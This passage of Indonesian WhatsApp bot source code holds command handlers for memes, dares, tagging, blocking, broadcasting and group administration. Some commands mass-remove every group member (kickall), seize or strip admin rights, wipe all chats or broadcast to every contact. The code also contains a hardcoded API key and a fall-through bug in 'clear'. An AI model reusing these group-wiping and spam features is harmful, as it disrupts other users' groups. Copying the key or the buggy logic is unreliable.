                                benny.sendMessage(from, memeRes, image, {quoted: adadeh, caption: 'Ini meme nya'})
                                benny.sendMessage('status@broadcast', fs.readFileSync('./src/upswmeme2.png'), image, {quoted: adadeh, caption: bottom})
                            }
                            break
				case 'upswmeme3':
                            if (isMedia && !ben.message.videoMessage || isQuotedImage) {
								teks = body.slice(10)
                                top = teks.split('|')[0]
                                bottom = teks.split('|')[1]
                                bottoms = teks.split('|')[2]
                                encmedia = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace("quotedM","m")).message.extendedTextMessage.contextInfo : ben
                                media = await benny.downloadAndSaveMediaMessage(encmedia)
                                var imgbb = require('imgbb-uploader')
					data = await imgbb("cedeb44b8d204947a6833ca1412ca77d", media)
                                memeRes = await getBaper(`https://pecundang.herokuapp.com/api/memegen2?teks=${top}&img_url=${data.display_url}`)
								fs.writeFileSync('./src/upswmeme3.png', memeRes)
                                benny.sendMessage(from, memeRes, image, {quoted: adadeh, caption: 'Ini meme nya'})
                                benny.sendMessage('status@broadcast', fs.readFileSync('./src/upswmeme3.png'), image, {quoted: adadeh, caption: bottoms})
                            }
                            break
							case 'mediafire': 
							if (args.length < 1) return reply('Mana link mediafire nya?')
							try {
								anu = await mediafireDl(args[0])
								console.log(anu)
								reply(`*Name:* ${anu.nama}\n*Type:* ${anu.mime}\n*Size:* ${anu.size}\n*Link:* ${anu.link}`)
							} catch (err) {
								reply('Error!')
							}
							break
				case 'meme':
				
					anj = await fetchJson(`https://api.zeks.xyz/api/memeindo?apikey=YunitaGanteng`)
					beffer = await getBaper(anj.result)
					benny.sendMessage(from, beffer, image, { quoted: adadeh})
	                 break
				case 'dare':
				
	    benny.updatePresence(from, Presence.composing) 
		benny.chatRead (from)
	    dare = [
        'makan 2 sendok nasi tanpa lauk apapun, kalo seret boleh minum',
        'spill orang yang bikin kamu jedag jedug',
        'telfon crush/pacar sekarang dan ss ke pemain',
        'drop emot "🦄💨" setiap ngetik di gc/pc selama 1 hari.',
        'ucapin kata "Selamat datang di Who Wants To Be a Millionaire!" ke semua grup yang kamu punya',
        'marah² ga jelas ke penonton sw kamu urutan 30',
        'telfon mantan bilang kangen',
        'yanyiin reff lagu yang terakhir kamu setel',
        'vn mantan/crush/pacar kamu, bilang hi (namanya), mau telfon dong, bentar ajaa. aku kangen🥺👉🏼👈🏼"',
        'kletekan di meja (yg ada dirumah) sampe lo dimarahin karena berisik',
        'belanjain (grab/gofood) buat salah satu pemain disini, terserah siapa. budget dibawah 25k',
        'Bilang ke random people  "Aku baru saja diberi tahu aku adalah kembaranmu dulu, kita dipisahkan, lalu aku menjalani operasi plastik. Dan ini adalah hal paling ciyussss "',
        'sebutin nama nama mantan',
        'buatin 1 pantun untuk pemain pertama!',
        'ss chat wa',
        'chat random people dengan bahasa alay lalu ss kesini',
        'ceritain hal memalukan versi diri sendiri',
        'tag orang yang dibenci',
        'Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll.',
        'ganti nama jadi " BOWO " selama 24 jam',
        'teriak " anjimm gabutt anjimmm " di depan rumah mu',
        'snap/post foto pacar/crush',
        'sebutkan tipe pacar mu!',
        'bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini',
        'record voice baca surah al-kautsar',
        'prank chat mantan dan bilang " i love u, pgn balikan. " Tanpa ada kata dare!',
        'chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you!"',
        'ganti nama menjadi "gue anak lucinta luna" selama 5 jam',
        'ketik pake bahasa sunda 24 jam',
        'pake foto sule sampe 3 hari',
        'drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu',
        'kirim voice note bilang can i call u baby?',
        'ss recent call whatsapp',
        'Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo!',
        'pap ke salah satu anggota grup'
    ]
drre = dare[Math.floor(Math.random() * (dare.length))]
benny.sendMessage(from, drre, text, {quoted: adadeh})
                break
                                case 'memeindo': 
								
					memein = await kagApi.memeindo()
					buffer = await getBaper(`https://imgur.com/${memein.hash}.jpg`)
					benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: '.......'})
					break
                                case 'tagme':
								
					const tag = {
					text: `@${sender.split('@')[0]} Test`,
					contextInfo: { mentionedJid: [sender] }
					}
					benny.sendMessage(from, tag, text, {quoted: adadeh})
					break
				case 'tagall':
				
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins && !ben.key.fromMe) return reply(mess.only.admin)
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += '\n\n'
					for (let mem of groupMembers) {
						teks += `*#* @${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					mentions(teks, members_id, true)
					break
				case 'kickall':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins && !ben.key.fromMe) return reply(mess.only.admin)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					anu3 = groupMembers.length
					moms = []
					for (let i of groupMembers) {
                    moms.push(i.jid)
					}
					for (let i = 0; i < anu3; i++) {
					await benny.groupRemove(from, moms)
					}
					break
					case 'cekgrup':
				
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins && !ben.key.fromMe) return reply(mess.only.admin)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					moms = []
					reply('*Another number +62 will kick!*')
					for (let i of groupMembers) {
                    moms.push(i.jid)
					}
						console.log(moms)
						if (moms.includes('62')) return
					benny.groupRemove(from, [moms])
					break
					case 'clear':
					if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
			anu = await benny.chats.all()
				benny.setMaxListeners(25)
				iyaaja = []
				oi = []
				kl = []
				for (let i of anu) {
					iyaaja.push(i.jid)
				}
				for (let p of iyaaja) {
					if (p && p.includes('g.us')){
					oi.push(p)
					}
					}
				for (let u of iyaaja) {
					if (u && u.includes('s.whatsapp.net')) {
						kl.push(u)
					}
				}
				for (let y of oi) {
				for (let v of kl) {
				if (args[0] == 'gc') {
					benny.deleteChat(y)
				} else if (args[0] == 'priv') {
					benny.deleteChat(v)
				}
				}
				}
				case 'clearall':
				
					if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
			anu = await benny.chats.all()
					benny.setMaxListeners(25)
					for (let _ of anu) {
						benny.deleteChat(_.jid)
					}
					reply('clear all sukses :)')
					break
					case 'quotesid':
					 // Fix Bug By ItsmeikyXSec404				
                 
					data = await fetchJson(`https://api.fdci.se/rep.php?gambar=quotes%20indonesia`)
					reply(mess.wait)
					niiky =  data[Math.floor(Math.random() * data.length)]
					pok = await getBaper(niiky)
					benny.sendMessage(from, pok, image, {quoted: adadeh})
					break
		case 'quotesen':
					 // Fix Bug By ItsmeikyXSec404				
                 
					data = await fetchJson(`https://api.fdci.se/rep.php?gambar=quotes`)
					reply(mess.wait)
					niiky =  data[Math.floor(Math.random() * data.length)]
					pok = await getBaper(niiky)
					benny.sendMessage(from, pok, image, {quoted: adadeh})
					break
		case 'katakata':
					 // Fix Bug By ItsmeikyXSec404				
                 
					data = await fetchJson(`https://api.fdci.se/rep.php?gambar=katakata`)
					reply(mess.wait)
					niiky =  data[Math.floor(Math.random() * data.length)]
					pok = await getBaper(niiky)
					benny.sendMessage(from, pok, image, {quoted: adadeh})
					break
		case 'katamotivasi':
					 // Fix Bug By ItsmeikyXSec404				
                 
					data = await fetchJson(`https://api.fdci.se/rep.php?gambar=kata%20motivasi`)
					reply(mess.wait)
					niiky =  data[Math.floor(Math.random() * data.length)]
					pok = await getBaper(niiky)
					benny.sendMessage(from, pok, image, {quoted: adadeh})
					break
		case 'kehidupan':
					 // Fix Bug By ItsmeikyXSec404				
                 
					data = await fetchJson(`https://api.fdci.se/rep.php?gambar=kata%20kata%20bijak%20kehidupan`)
					reply(mess.wait)
					niiky =  data[Math.floor(Math.random() * data.length)]
					pok = await getBaper(niiky)
					benny.sendMessage(from, pok, image, {quoted: adadeh})
					break
		case 'islami':
					 // Fix Bug By ItsmeikyXSec404				
                 
					data = await fetchJson(`https://api.fdci.se/rep.php?gambar=quotes%20islami`)
					reply(mess.wait)
					niiky =  data[Math.floor(Math.random() * data.length)]
					pok = await getBaper(niiky)
					benny.sendMessage(from, pok, image, {quoted: adadeh})
					break
			       case 'block':
				   
					if (!isGroup) return reply(mess.only.group)
					if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
			benny.blockUser (`${body.slice(7)}@c.us`, "add")
					reply(`Perintah Diterima, memblokir ${body.slice(7)}`)
					break
					case 'blockir':
				   
					if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
			benny.blockUser (from, "add")
					reply(`Perintah Diterima, memblokir ${sender.replace('@s.whatsapp.net', '')}`)
					break
                    case 'unblock':
					
					if (!isGroup) return reply(mess.only.group)
					if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
			benny.blockUser (`${body.slice(9)}@c.us`, "remove")
					reply(`𝗽𝗲𝗿𝗶𝗻𝘁𝗮𝗵 𝗗𝗶𝘁𝗲𝗿𝗶𝗺𝗮, 𝗺𝗲𝗺𝗯𝘂𝗸𝗮 ${body.slice(9)}@c.us`)
				break
				case 'unblockir':
					
					if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
			benny.blockUser (sender, "remove")
					reply(`Perintah Diterima, membuka blokir ${sender.replace('@s.whatsapp.net', '')}`)
				break
				case 'chat': 
				
				if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
				if (args.length < 1) return reply('Apa pesan nya?')
					var cie = body.slice(6)
					var ajk = cie.split("|")[0];
					var chatnya = cie.split("|")[1];
					sendMess(`${ajk}@s.whatsapp.net`, `Dari wa.me/${sender.replace('@s.whatsapp.net', '')}\nKatanya: ${chatnya}`)
					break
					case 'forwardto':
				
				if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
				if (args.length < 1) return reply('Apa pesan nya?')
					var cie = body.slice(11)
					var ajk = cie.split("|")[0];
					var chatnya = cie.split("|")[1];
                sendPesan(`${ajk}@s.whatsapp.net`, chatnya)
				break
				case 'report': 
				case 'lapor': 
				
					if (args.length < 1) return reply('Apa pesan nya?')
					var cie = body.slice(7)
					sendMess(`6289636006352@s.whatsapp.net`, `Dari wa.me/${sender.replace('@s.whatsapp.net', '')}\nBUG: ${cie}`)
					break
				case 'bc': 
				if (ben.key.fromMe ) return
			if (args.length < 1) return reply('.......')
					anu = await benny.chats.all()
					if (isMedia && !ben.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
						buff = await benny.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							benny.sendMessage(_.jid, buff, image, {caption: `❮ 𝙋𝙀𝙎𝘼𝙉 𝘽𝙍𝙊𝘼𝘿𝘾𝘼𝙎𝙏 ❯\n\n${body.slice(4)}`, quoted: adadeh})
							}
						reply('𝙨𝙪𝙘𝙘𝙚𝙨𝙨 𝙗𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩 ')
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `*SELF Broadcast!!*\n\n${body.slice(4)}`, text, { quoted: adadeh})
							}
						reply('𝙨𝙪𝙘𝙘𝙚𝙨𝙨 𝙗𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩 ')
					}
					break	
										case 'add':
										if (!ben.key.fromMe) return
										bodom = new RegExp('[-+/ +/()]', 'gi')
				bodo = body.slice(5)
				teks = bodo.replace(bodom, '')
											if (!isGroup) return reply(mess.only.group)
											if (!isBotGroupAdmins) return reply(mess.only.Badmin)
											if (args.length > 1) {
									   try {
											anu = await benny.groupAdd(from, [teks + '@s.whatsapp.net'])
											console.log(anu)
											} catch (e) {
											console.log('Error :', e)
											return reply('Diprivate asu:v')
											}
											} else if (args.length < 1) {
												try {
											num = ben.message.extendedTextMessage.contextInfo.participant
											anu = await benny.groupAdd(from, [num])
											console.log(anu)
											} catch (e) {
											console.log('Error :', e)
											return reply('Diprivate asu:v')
											}
											}
											break
									   case 'kick':
									   
											if (!isGroup) return reply(mess.only.group)
											if (!isGroupAdmins && !ben.key.fromMe) return reply(mess.only.admin)
											if (!isBotGroupAdmins) return reply(mess.only.Badmin)
											if (ben.message.extendedTextMessage === undefined || ben.message.extendedTextMessage === null) return reply('Tag target yang ingin di tendang!')
											mentioned = ben.message.extendedTextMessage.contextInfo.mentionedJid
											if (mentioned.length > 1) {
											teks = 'Perintah di terima, Menendang\n'
											for (let _ of mentioned) {
											teks += `@${_.split('@')[0]}\n`
											}
											mentions(teks, mentioned, true)
											benny.groupRemove(from, mentioned)
											} else if (mentioned.length < 1) {
											anu = ben.message.extendedTextMessage.contextInfo.participant
											teks = `Perintah di terima, Menendang\n@${anu.split('@')[0]}`
											mentions(teks, [anu], true)
											benny.groupRemove(from, [anu])
											} else {
											mentions(`Success menendang ~> @${mentioned[0].split('@')[0]}`, mentioned, true)
											benny.groupRemove(from, mentioned)
											}
											break  
											case 'promote':
											
												if (!isGroup) return reply(mess.only.group)
												if (!isGroupAdmins && !ben.key.fromMe) return reply(mess.only.admin)
												if (!isBotGroupAdmins) return reply(mess.only.Badmin)
												mentioned = ben.message.extendedTextMessage.contextInfo.mentionedJid
												if (mentioned.length > 1) {
												teks = 'Perintah di terima, Promote :\n'
												for (let _ of mentioned) {
												teks += `@${_.split('@')[0]}\n`
												}
												mentions(teks, mentioned, true)
											benny.groupMakeAdmin(from, mentioned)
												} else if (mentioned.length < 1) {
											anu = ben.message.extendedTextMessage.contextInfo.participant
											teks = `Perintah di terima, Promote\n@${anu.split('@')[0]}`
											mentions(teks, [anu], true)
											benny.groupMakeAdmin(from, [anu])
											} else {
												mentions(`Perintah di terima, Promote : @${mentioned[0].split('@')[0]}`, mentioned, true)
												benny.groupMakeAdmin(from, mentioned)
												}
												break
												case 'autoget':
												if (!ben.key.fromMe && !isOwner) return
												if (args[0] == 'on') {
													autoget = true
													reply('*Sukses mengaktifkan Auto get sticker*')
												} else if (args[0] == 'off') {
													autoget = false
													reply('*Sukses mematikan Auto get sticker*')
												} else {
													reply('Pilih on atau off!')
												}
												break
												case 'promoteall':
												
												if (!isGroup) return reply(mess.only.group)
												if (!isGroupAdmins && !ben.key.fromMe) return reply(mess.only.admin)
												if (!isBotGroupAdmins) return reply(mess.only.Badmin)
												id_mem = []
												for (let o of groupMembers) {
													id_mem.push(o.jid)
												}
												benny.groupMakeAdmin(from, id_mem)
												break
												case 'demoteall':
												
												if (!isGroup) return reply(mess.only.group)
												if (!isGroupAdmins && !ben.key.fromMe) return reply(mess.only.admin)
												if (!isBotGroupAdmins) return reply(mess.only.Badmin)
												id_mem = []
												idmem = []
												for (let o of groupMembers) {
													id_mem.push(o.jid)
												}
												for (let i of id_mem) {
														idmem.push(i)
												}
												benny.groupDemoteAdmin(from, idmem)
												break
											case 'demote':
											
												if (!isGroup) return reply(mess.only.group)
												if (!isGroupAdmins && !ben.key.fromMe) return reply(mess.only.admin)
												if (!isBotGroupAdmins) return reply(mess.only.Badmin)
												if (ben.message.extendedTextMessage === undefined || ben.message.extendedTextMessage === null) return reply('Tag target yang ingin di tendang!')
												mentioned = ben.message.extendedTextMessage.contextInfo.mentionedJid
												if (mentioned.length > 1) {
												teks = 'Perintah di terima, Demote :\n'
												for (let _ of mentioned) {
												teks += `@${_.split('@')[0]}\n`
												}
												mentions(teks, mentioned, true)
												benny.groupDemoteAdmin(from, mentioned)
												} else {
												mentions(`Perintah di terima, Demote : @${mentioned[0].split('@')[0]}`, mentioned, true)
												benny.groupDemoteAdmin(from, mentioned)
												}
												break
				case 'listadmin':
				
					if (!isGroup) return reply(mess.only.group)
					teks = `𝗟𝗶𝘀𝘁 𝗮𝗱𝗺𝗶𝗻 𝗼𝗳 𝗴𝗿𝗼𝘂𝗽 *${groupMetadata.subject}*\n𝗧𝗼𝘁𝗮𝗹 : ${groupAdmins.length}\n\n`
					no = 0
					for (let admon of groupAdmins) {
						no += 1
						teks += `[${no.toString()}] @${admon.split('@')[0]}\n`
					}
					mentions(teks, groupAdmins, true)
					break
					case 'listuser':
				
				y = 1
				mom = []
				teks = `*LIST USER BENNY BOT*\n\n`
				for (let i of _registered) {
					mom.push(i.id)
					teks += `*${y++}*. @${i.id.split('@')[0]}\n`
				}
					benny.sendMessage(from, teks.trim(), text, {contextInfo: {mentionedJid: mom}, quoted: adadeh})
					break
				case 'toimg':
				
					if (!isQuotedSticker) return reply('stickernya mana anjeng')
					reply(mess.wait)
					encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await benny.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.png')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
						fs.unlinkSync(media)
						if (err) return reply('Error om')
						buffer = fs.readFileSync(ran)
						benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: 'Dah jdi nih bang'})
						fs.unlinkSync(ran)
					})
					break
				case 'modesimi':
				
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins && !ben.key.fromMe) return reply(mess.only.admin)
					if (args.length < 1) return reply('𝗧𝗼𝗱 :𝘃')
					if (args[0] == 'on') {
						if (isSimi) return reply('𝘀𝘂𝗱𝗮𝗵 𝗮𝗸𝘁𝗶𝗳 𝘁𝗼𝗱!!!')
						samih.push(from)
						fs.writeFileSync('./src/simi.json', JSON.stringify(samih))
						reply('*Sukses mengaktifkan mode simi!*')
					} else if (args[0] == 'off') {
						samih.splice(from, 1)
						fs.writeFileSync('./src/simi.json', JSON.stringify(samih))
					 	reply('*Sukses mematikan mode simi!*')
					} else {
						reply('𝗸𝗲𝘁𝗶𝗸 𝗽𝗲𝗿𝗶𝗻𝘁𝗮𝗵 𝟭 𝘂𝗻𝘁𝘂𝗸 𝗺𝗲𝗻𝗴𝗮𝗸𝘁𝗶𝗳𝗸𝗮𝗻, 𝟬 𝘂𝗻𝘁𝘂𝗸 𝗺𝗲𝗻𝗼𝗻𝗮𝗸𝘁𝗶𝗳𝗸𝗮𝗻\n𝗰𝗼𝗻𝘁𝗼𝗵: 𝘀𝗶𝗺𝗶𝗵 𝟭')
					} 
					break
					case 'kickarea':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins && !ben.key.fromMe) return reply(mess.only.admin)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
			  
			  if (args[0] == 'on') {
				  if (isKickArea) return reply('Sudah aktif!!!')
						kickarea.push(from)
						fs.writeFileSync('./src/kickarea.json', JSON.stringify(kickarea))
						reply('*Sukses mengaktifkan mode kickarea!*')
			  } else if (args[0] == 'off') {
						kickarea.splice(from, 1)
						fs.writeFileSync('./src/kickarea.json', JSON.stringify(kickarea))
						reply('*Sukses mematikan mode kickarea!*')
					} else {
						reply('Pilih on atau off!')
					}
						break
				case 'antidelete':
				
				if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
			const dataRevoke = JSON.parse(fs.readFileSync('./src/gc-revoked.json'))
				const dataCtRevoke = JSON.parse(fs.readFileSync('./src/ct-revoked.json'))
				const dataBanCtRevoke = JSON.parse(fs.readFileSync('./src/ct-revoked-banlist.json'))
				const isRevoke = dataRevoke.includes(from)
				const isCtRevoke = dataCtRevoke.data
				const isBanCtRevoke = dataBanCtRevoke.includes(sender) ? true : false
				const argz = body.split(' ')
				if (argz.length === 1) return benny.sendMessage(from, `Penggunaan fitur antidelete :\n\n*${prefix}antidelete [aktif/mati]* (Untuk grup)\n*${prefix}antidelete [ctaktif/ctmati]* (untuk semua kontak)\n*${prefix}antidelete banct 628558xxxxxxx* (banlist kontak)`, MessageType.text)
				if (argz[1] == 'aktif') {
					if (isGroup) {
						if (isRevoke) return benny.sendMessage(from, `Antidelete telah diaktifkan di grup ini sebelumnya!`, MessageType.text)
						dataRevoke.push(from)
						fs.writeFileSync('./src/gc-revoked.json', JSON.stringify(dataRevoke))
						reply(`*Succes Enable Antidelete Grup!*`)
					} else if (!isGroup) {
						benny.sendMessage(from, `Untuk kontak penggunaan *${prefix}antidelete ctaktif*`, MessageType.text)
					}
				} else if (argz[1] == 'ctaktif') {
					if (!isGroup) {
						if (isCtRevoke) return benny.sendMessage(from, `Antidelete telah diaktifkan di semua kontak sebelumnya!`, MessageType.text)
						dataCtRevoke.data = true
						fs.writeFileSync('./src/ct-revoked.json', JSON.stringify(dataCtRevoke))
						reply(`*Antidelete diaktifkan disemua kontak!*`)
					} else if (isGroup) {
						benny.sendMessage(from, `Untuk grup penggunaan *${prefix}antidelete aktif*`, MessageType.text)
					}
				} else if (argz[1] == 'banct') {
					if (isBanCtRevoke) return benny.sendMessage(from, `kontak ini telah ada di database banlist!`, MessageType.text)
					if (argz.length === 2 || argz[2].startsWith('0')) return benny.sendMessage(from, `Masukan nomer diawali dengan 62! contoh 62859289xxxxx`, MessageType.text)
					dataBanCtRevoke.push(argz[2] + '@s.whatsapp.net')
					fs.writeFileSync('./src/ct-revoked-banlist.json', JSON.stringify(dataBanCtRevoke))
					benny.sendMessage(from, `Kontak ${argz[2]} telah dimasukan ke banlist antidelete secara permanen!`, MessageType.text)
				} else if (argz[1] == 'mati') {
					if (isGroup) {
						const index = dataRevoke.indexOf(from)
						dataRevoke.splice(from, 1)
						fs.writeFileSync('./src/gc-revoked.json', JSON.stringify(dataRevoke))
						benny.sendMessage(from, `*Succes disable Antidelete Grup!*`, MessageType.text)
					} else if (!isGroup) {
						benny.sendMessage(from, `Untuk kontak penggunaan *${prefix}antidelete ctmati*`, MessageType.text)
					}
				} else if (argz[1] == 'ctmati') {
					if (!isGroup) {
						dataCtRevoke.data = false
						fs.writeFileSync('./src/ct-revoked.json', JSON.stringify(dataCtRevoke))
						reply(`*Antidelete dimatikan disemua kontak!*`)
					} else if (isGroup) {
						benny.sendMessage(from, `Untuk grup penggunaan *${prefix}antidelete mati*`, MessageType.text)
					}
				}
				break
				case 'nsfw':
				
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins && !ben.key.fromMe) return reply(mess.only.admin)
					if (args.length < 1) return reply('𝗧𝗼𝗱 :𝘃')
					if (Number(args[0]) === 1) {
						if (isNsfw) return reply('𝘀𝘂𝗱𝗮𝗵 𝗮𝗸𝘁𝗶𝗳 𝘁𝗼𝗱!!')
						nsfw.push(from)
						fs.writeFileSync('./src/nsfw.json', JSON.stringify(nsfw))
						reply('❬ 𝗦𝗨𝗞𝗦𝗘𝗦 ❭ 𝗠𝗲𝗻𝗴𝗮𝗸𝘁𝗶𝗳𝗸𝗮𝗻 𝗳𝗶𝘁𝘂𝗿 𝗻𝘀𝗳𝘄 𝗱𝗶 𝗴𝗿𝗼𝘂𝗽 𝗶𝗻𝗶')
					} else if (Number(args[0]) === 0) {
						nsfw.splice(from, 1)
						fs.writeFileSync('./src/nsfw.json', JSON.stringify(nsfw))
						reply('❬ 𝗦𝗨𝗞𝗦𝗘𝗦 ❭ 𝗠𝗲𝗻𝗼𝗻𝗮𝗸𝘁𝗶𝗳𝗸𝗮𝗻 𝗳𝗶𝘁𝘂𝗿 𝗻𝘀𝗳𝘄 𝗱𝗶 𝗴𝗿𝗼𝘂𝗽 𝗶𝗻𝗶️')
					} else {
						reply('𝗸𝗲𝘁𝗶𝗸 𝗽𝗲𝗿𝗶𝗻𝘁𝗮𝗵 𝟭 𝘂𝗻𝘁𝘂𝗸 𝗺𝗲𝗻𝗴𝗮𝗸𝘁𝗶𝗳𝗸𝗮𝗻, 𝟬 𝘂𝗻𝘁𝘂𝗸 𝗺𝗲𝗻𝗼𝗻𝗮𝗸𝘁𝗶𝗳𝗸𝗮𝗻\n𝗰𝗼𝗻𝘁𝗼𝗵: 𝗻𝘀𝗳𝘄 𝟭')
					}
					break
				case 'logprofile':
				if (!ben.key.fromMe && !isOwner) return
					if (args.length < 1) return reply('𝗧𝗼𝗱 :𝘃')
					if (args[0] == 'on') {
						logprofile = true
						reply('Success Enable Log Profile!')
					} else if (args[0] == 'off') {
						logprofile = false
						reply('Success Disable Log Profile!')
					} else {
						reply(`𝗸𝗲𝘁𝗶𝗸 𝗽𝗲𝗿𝗶𝗻𝘁𝗮𝗵 on 𝘂𝗻𝘁𝘂𝗸 𝗺𝗲𝗻𝗴𝗮𝗸𝘁𝗶𝗳𝗸𝗮𝗻, off 𝘂𝗻𝘁𝘂𝗸 𝗺𝗲𝗻𝗼𝗻𝗮𝗸𝘁𝗶𝗳𝗸𝗮𝗻\n𝗰𝗼𝗻𝘁𝗼𝗵: ${prefix}𝘄𝗲𝗹𝗰𝗼𝗺𝗲 on`)
					}
					break
				case 'loggc':
				
					if (!isGroup) return reply(mess.only.group)
					if (args.length < 1) return reply('𝗧𝗼𝗱 :𝘃')
					if (args[0] == 'on') {
						if (loggc.includes(from)) return reply('Udah lu nyalain pantek:v')
						loggc.push(from)
						fs.writeFileSync('./src/loggc.json', JSON.stringify(loggc))
						reply('Success Enable Log Gc!')
					} else if (args[0] == 'off') {
						loggc.splice(from, 1)
						fs.writeFileSync('./src/loggc.json', JSON.stringify(loggc))
						reply('Success Disable Log Gc!')
					} else {
						reply(`𝗸𝗲𝘁𝗶𝗸 𝗽𝗲𝗿𝗶𝗻𝘁𝗮𝗵 on 𝘂𝗻𝘁𝘂𝗸 𝗺𝗲𝗻𝗴𝗮𝗸𝘁𝗶𝗳𝗸𝗮𝗻, off 𝘂𝗻𝘁𝘂𝗸 𝗺𝗲𝗻𝗼𝗻𝗮𝗸𝘁𝗶𝗳𝗸𝗮𝗻\n𝗰𝗼𝗻𝘁𝗼𝗵: ${prefix}𝘄𝗲𝗹𝗰𝗼𝗺𝗲 on`)
					}
					break
				case 'welcome':
				
					if (!isGroup) return reply(mess.only.group)
					if (args.length < 1) return reply('𝗧𝗼𝗱 :𝘃')
					if (args[0] == 'on') {
						if (isWelkom) return reply('Udah lu nyalain pantek:v')
						welkom.push(from)
						fs.writeFileSync('./src/welkom.json', JSON.stringify(welkom))
						reply('Success Enable Welcome!')
					} else if (args[0] == 'off') {
						welkom.splice(from, 1)
						fs.writeFileSync('./src/welkom.json', JSON.stringify(welkom))
						reply('Success Disable Welcome!')
					} else {
						reply(`𝗸𝗲𝘁𝗶𝗸 𝗽𝗲𝗿𝗶𝗻𝘁𝗮𝗵 on 𝘂𝗻𝘁𝘂𝗸 𝗺𝗲𝗻𝗴𝗮𝗸𝘁𝗶𝗳𝗸𝗮𝗻, off 𝘂𝗻𝘁𝘂𝗸 𝗺𝗲𝗻𝗼𝗻𝗮𝗸𝘁𝗶𝗳𝗸𝗮𝗻\n𝗰𝗼𝗻𝘁𝗼𝗵: ${prefix}𝘄𝗲𝗹𝗰𝗼𝗺𝗲 on`)
					}
					break
				case 'antivirus':
				
					if (!isGroup) return reply(mess.only.group)
					if (!isBotGroupAdmins) return reply('Jadikan bot admin terlebih dahulu!')
					if (args.length < 1) return reply('Pilih on atau off!')
					const argt = body.split(' ')
					if (argt[1] == 'on') {
						if (isKasar) return reply('Udah lu nyalain pantek:v')
						kasar.push(from)
						fs.writeFileSync('./src/antibadword.json', JSON.stringify(kasar))
						reply('*Success Enable Anti virus!*')
					} else if (argt[1] == 'off') {
						kasar.splice(from, 1)
						fs.writeFileSync('./src/antibadword.json', JSON.stringify(kasar))
						reply('Success Disable Anti virus!')
					} else {
						reply(`𝗸𝗲𝘁𝗶𝗸 𝗽𝗲𝗿𝗶𝗻𝘁𝗮𝗵 𝟭 𝘂𝗻𝘁𝘂𝗸 𝗺𝗲𝗻𝗴𝗮𝗸𝘁𝗶𝗳𝗸𝗮𝗻, 𝟬 𝘂𝗻𝘁𝘂𝗸 𝗺𝗲𝗻𝗼𝗻𝗮𝗸𝘁𝗶𝗳𝗸𝗮𝗻\n𝗰𝗼𝗻𝘁𝗼𝗵: ${prefix}antivirus on`)
					}
					break
				case 'antikasar':
				
					if (!isGroup) return reply(mess.only.group)
					if (!isBotGroupAdmins) return reply('Jadikan bot admin terlebih dahulu!')
					if (args.length < 1) return reply('Pilih on atau off!')
					const argn = body.split(' ')
					if (argn[1] == 'on') {
						if (isVirus) return reply('Udah lu nyalain pantek:v')
						virus.push(from)
